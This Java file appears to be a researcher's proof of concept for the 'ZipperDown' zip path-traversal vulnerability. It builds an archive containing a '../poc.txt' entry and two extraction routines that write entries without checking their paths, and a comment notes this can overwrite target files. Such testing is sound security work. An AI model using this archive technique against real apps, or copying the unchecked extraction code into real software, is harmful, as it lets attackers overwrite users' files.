package com.xiaobai.android;

import java.io.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

/**
 * ZipperDown android漏洞测试
 */
public class ZipperDown {
    public static void main(String[] args) throws IOException {
        createZip();
        unZip();
        unZip2();
    }


    private static void createZip() throws IOException {
        FileOutputStream fileOutputStream=new FileOutputStream("poc.zip");
        ZipOutputStream zipOutputStream=new ZipOutputStream(fileOutputStream);

        ZipEntry zipEntry=new ZipEntry("../poc.txt");
        zipOutputStream.putNextEntry(zipEntry);

        String text="hello...";
        zipOutputStream.write(text.getBytes());
        zipOutputStream.closeEntry();

        zipOutputStream.close();
    }


    /**
     * 按道理正常结果会在 本项目的上级目录进行解压，本方法测试相对路径
     * 测试结果正常。
     * @throws IOException
     */
    private static void unZip() throws IOException {
        ZipInputStream zipInputStream=new ZipInputStream(new FileInputStream("poc.zip"));

        ZipEntry zipEntry=zipInputStream.getNextEntry();
        while (zipEntry!=null){
            String name=zipEntry.getName();
            FileOutputStream fileOutputStream=new FileOutputStream(name);
            byte[] bytes=new byte[128];
            int read=zipInputStream.read(bytes);
            while (read!=-1){
                fileOutputStream.write(bytes,0,read);
                read=zipInputStream.read(bytes);
            }
            zipEntry=zipInputStream.getNextEntry();
        }
        zipInputStream.closeEntry();
        zipInputStream.close();
    }

    /**
     * 测试绝度路径 会解压到/Users/xiaobaiyey/Desktop/work/
     * 实际测试结果文件会被解压到 /Users/xiaobaiyey/Desktop/中
     * 可以利用此漏洞进行解压覆盖掉目标文件
     * @throws IOException
     */
    private static void unZip2() throws IOException {
        ZipInputStream zipInputStream=new ZipInputStream(new FileInputStream("poc.zip"));

        ZipEntry zipEntry=zipInputStream.getNextEntry();

        String outdir="/Users/xiaobaiyey/Desktop/work/";
        File file=new File(outdir);
        System.out.println(file.exists());
        while (zipEntry!=null){
            String name=zipEntry.getName();
            System.out.println("穿越输出路径："+outdir+name);
            FileOutputStream fileOutputStream=new FileOutputStream(outdir+name);
            byte[] bytes=new byte[128];
            int read=zipInputStream.read(bytes);
            while (read!=-1){
                fileOutputStream.write(bytes,0,read);
                read=zipInputStream.read(bytes);
            }
            fileOutputStream.close();
            zipEntry=zipInputStream.getNextEntry();
        }
        zipInputStream.closeEntry();
        zipInputStream.close();
    }

}
